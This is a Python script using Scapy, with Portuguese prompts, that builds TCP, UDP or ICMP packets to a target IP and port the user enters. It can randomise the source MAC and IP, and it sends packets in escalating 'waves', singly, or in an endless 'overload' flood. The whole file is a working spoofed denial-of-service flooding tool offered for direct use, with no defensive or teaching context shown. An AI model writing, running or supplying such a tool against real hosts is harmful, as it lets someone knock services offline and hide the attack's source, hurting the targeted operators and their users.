from scapy.all import IP, TCP, UDP, ICMP, sendp, RandMAC, Ether, RandIP, get_if_hwaddr
import time

while True:
    try:
        # Configuração dos parâmetros
        host_ip = input("Informe o endereço IP do host de destino: ")
        host_porta = int(input("Informe a porta de destino: "))
        payload = input("Informe um payload para estar no pacote: ")
        protocolo = input("Selecione o tipo de pacote (TCP, UDP ou ICMP): ").upper()
        usar_aleatorio = input("Deseja usar endereço MAC e IP aleatórios? S para sim ou qualquer outra tecla para nao: ").upper()
        break
    except:
        print("Erro de processamento das entradas")

if protocolo == "TCP":
    camadaEscolhida = TCP(dport=host_porta)
elif protocolo == "UDP":
    camadaEscolhida = UDP(dport=host_porta)
elif protocolo == "ICMP":
    camadaEscolhida = ICMP()
else:
    print("Protocolo inválido. Usando pacote TCP como padrão.")
    camadaEscolhida = TCP(dport=host_porta)


if usar_aleatorio == "S":
    camadaEther = Ether(src=RandMAC())
    camadaIP = IP(dst=host_ip, src=RandIP())
    pktCompleto = camadaEther / camadaIP / camadaEscolhida / payload
else:
    camadaIP = IP(dst=host_ip)
    camadaEther = Ether(src=get_if_hwaddr('wlxf4ec38924d47'))
    pktCompleto = camadaEther / camadaIP / camadaEscolhida / payload

print(pktCompleto.show())
print(pktCompleto.summary())


while True:
    modo = int(input("Escolha o modo de envio\n 1 - ondas / 2 - envio unico / 3 - sobrecarga\n"))
    
    if modo == 1:
        try:
            while True:
                sendp(pktCompleto, inter=0, count=10)
                time.sleep(2)
                sendp(pktCompleto, inter=0, count=20)
                time.sleep(2)
                sendp(pktCompleto, inter=0, count=30)
                time.sleep(2)
                sendp(pktCompleto, inter=0, count=40)
                time.sleep(2)
                sendp(pktCompleto, inter=0, count=50)
                time.sleep(2)
                sendp(pktCompleto, inter=0, count=60)
                time.sleep(2)
                sendp(pktCompleto, inter=0, count=70)
                time.sleep(2)
                sendp(pktCompleto, inter=0, count=80)
        except:
            print("\nErro de processamento ou interrupção manual executada")
            break
        
    if modo == 2:
        try:
            sendp(pktCompleto, inter=0, count=1)
            break
        except:
            print("\nErro de processamento ou interrupção manual executada")
            break

    if modo == 3:
        try:
            while True:
                sendp(pktCompleto, inter=0, loop=1)
        except:
            print("\nErro de processamento ou interrupção manual executada")
            break
    
    else:
        print("Resposta invalida, revise se foi digitado 1, 2 ou 3")

